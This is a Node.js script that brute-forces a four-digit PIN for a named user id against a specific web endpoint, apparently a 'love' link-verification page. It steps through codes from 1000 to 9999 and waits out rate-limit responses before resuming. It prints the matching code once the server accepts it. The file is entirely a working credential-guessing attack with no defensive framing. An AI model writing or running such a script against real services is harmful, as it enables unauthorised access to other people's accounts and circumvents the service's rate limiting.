const rp = require('request-promise');

getPassword('inhrjad', 1000).catch(console.error);

async function getPassword (id, startFrom) {
  let correctPassword;

  for (let i = startFrom; i < 10000; i++) {
    const res = await rp(getOptions(id, i));

    printResponse(i, res);

    if (res.body.error === false) {
      correctPassword = i;
      break;
    }

    if (res.statusCode !== 200) {
      await sleep(3000);
      return await getPassword(id, i).catch(console.error);
    }
  }

  console.log(`Your secret code is: ${addZerosToNumber(correctPassword)}-${id}`);
}


function printResponse (i, res) {
  console.log('\n===============================');
  console.log(`Got response from ${addZerosToNumber(i)}`);
  console.log(`Status: ${res.statusCode}`);
  console.log(`error: ${res.body.error}`);
  console.log(`msg: ${res.body.msg}`);
  console.log('===============================');
}

function getOptions (id, i) {
  return {
    uri: 'https://getlinks.info/love/verifypin.php',
    qs: { userid: id, pwd: addZerosToNumber(i) },
    resolveWithFullResponse: true,
    json: true,
    simple: false
  };
}

function addZerosToNumber (num) {
  num = String(num);

  if (num.length >= 4) return num;

  while (num.length !== 4) num = `0${num}`;
  return num;
}


function sleep (ms) {
  return new Promise((resolve, reject) => setTimeout(() => resolve(), ms));
}
